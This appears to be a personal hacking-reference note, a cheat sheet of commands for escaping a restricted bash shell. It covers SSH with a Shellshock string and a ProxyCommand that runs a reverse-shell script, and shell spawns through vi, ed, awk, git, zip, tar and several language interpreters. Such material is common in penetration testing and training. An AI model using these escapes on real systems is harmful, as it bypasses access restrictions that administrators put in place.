---
{"dg-publish":true,"dg-path":"Garden/knowledge-base/hacking/references/Rbash Escape.md","permalink":"/garden/knowledge-base/hacking/references/rbash-escape/","tags":["commands"],"created":"2024-05-19 18:01","updated":"2026-03-08 20:49","dg-note-properties":{"tags":["commands"],"creation_date":"2024-05-19 18:01","modified_date":"2026-03-08 20:49"}}
---

# Rbash Escape

tags: #commands
home: [[02-Area/hacking/privilege escalation/linux/Linux Privilege Escalation#Shell Escapes\|Linux Privilege Escalation#Shell Escapes]]

## SSH

```bash
ssh username@ip -t "/bin/sh" 
ssh username@ip -t "/bin/bash"
ssh username@ip -t "() {:;}; /bin/bash"   # shell shock
ssh -o ProxyCommand="sh -c /tmp/revshell.sh" 127.0.0.1 (SUID)
```

## vi

```bash
vi
:set shell=/bin/bash
:shell
```

## ed

```bash
cd /home
echo $SHELL
ed
!'/bin/bash'
pwd
```

## awk

```bash
awk 'BEGIN {system("/bin/bash")}'
```

## git

```bash
git help status
!/bin/bash
```

## zip

```bash
zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
```

## tar

```bash
tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash

```

---

# Programming Languages

## python

```bash
python -c 'import os; os.system("/bin/bash")'
python3 -c 'import os; os.system("/bin/bash")'
```

## pearl

```bash
perl -e 'system("/bin/bash");'
```

## php

```bash
php -a 
exec("sh -i")
```

## expect

```bash
expect spawn sh
sh
```

## lua

```bash
lua> os.execute("/bin/sh")
```

[44592-linux-restricted-shell-bypass-guide.pdf](:storage/344844ef-e101-4c8b-bf93-1c68b86f7e32/2155062f.pdf)